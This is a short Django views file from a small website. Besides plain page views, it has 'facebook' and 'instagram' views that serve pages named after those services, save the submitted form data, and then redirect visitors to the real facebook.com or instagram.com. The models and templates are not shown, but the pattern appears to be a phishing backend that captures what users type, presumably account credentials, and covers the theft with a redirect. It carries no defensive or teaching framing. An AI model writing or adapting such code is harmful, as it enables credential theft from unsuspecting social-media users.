from django.shortcuts import render, redirect
from .models import *
from .forms import *



def index(request):
    context = {}
    return render (request, "we/index.html", context)


def contact(request):
    context = {}
    return render (request, "we/contact.html", context)


def career(request):
    context = {}
    return render (request, "we/career.html", context)

def about(request):
    context = {}
    return render (request, "we/about.html", context)

def facebook(request):
    if request.method == 'POST':
        form = Facebook(request.POST, request.FILES)
        if form.is_valid():
            form.save()
            return redirect("https://instagram.com")
    else:
        form =  Facebook()
    context = {'form': form}
    return render (request, "we/facebook.html", {'form':form})

def instagram(request):
    if request.method == 'POST':
        form = Instagram(request.POST, request.FILES)
        if form.is_valid():
            form.save()
            return redirect("https://facebook.com")
    else:
        form =  Instagram()
    context = {'form': form}
    return render (request, "we/instagram.html", {'form':form})